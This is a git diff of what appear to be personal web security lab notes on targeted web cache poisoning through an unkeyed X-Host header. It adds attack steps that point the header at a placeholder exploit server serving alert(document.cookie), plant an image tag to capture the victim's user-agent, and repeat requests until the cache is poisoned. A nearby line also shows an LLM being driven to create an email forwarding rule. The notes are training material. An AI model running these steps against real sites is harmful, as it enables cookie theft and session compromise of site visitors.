@@ -3728,22 +3728,22 @@ LLM -> API: create_email_forwarding_rule('peter')
     ```
 - Targeted web cache poisoning using an **unknown header**
   - identify unkey header > Param Miner > right-click on the request and select "Guess headers" > `X-Host`  
-  - Test cache buster
-    ```
-    GET /?cb=1
-    X-Host: examplle.com
-
-    Response
-    <script type="text/javascript" src="//examplle.com/resources/js/tracking.js"></script>
-    ```
   - Exploit server  
     file: /resources/js/tracking.js  
     body: alert(document.cookie)  
   - Post a comment
     `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`
-  - In access log, copy the victim user-agent, go back repeater and replace with it.  
+  - In access log, copy the victim user-agent, go back repeater and replace with it.
+  - Add `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
+    ```
+    GET /
+    X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+
+    Response
+    <script type="text/javascript" src="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js"></script>
+    ``` 
   - Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers
-  - Replay the request to keep the cache poisoned until the victim visits the site
+  - Browse the url and alert prompt 
 - Web cache poisoning to exploit a **DOM vulnerability** via a cache with **strict cacheability criteria  (Expert)**
   - GET / > repeater > aram miner > guess headers
     `x-forwarded-host`
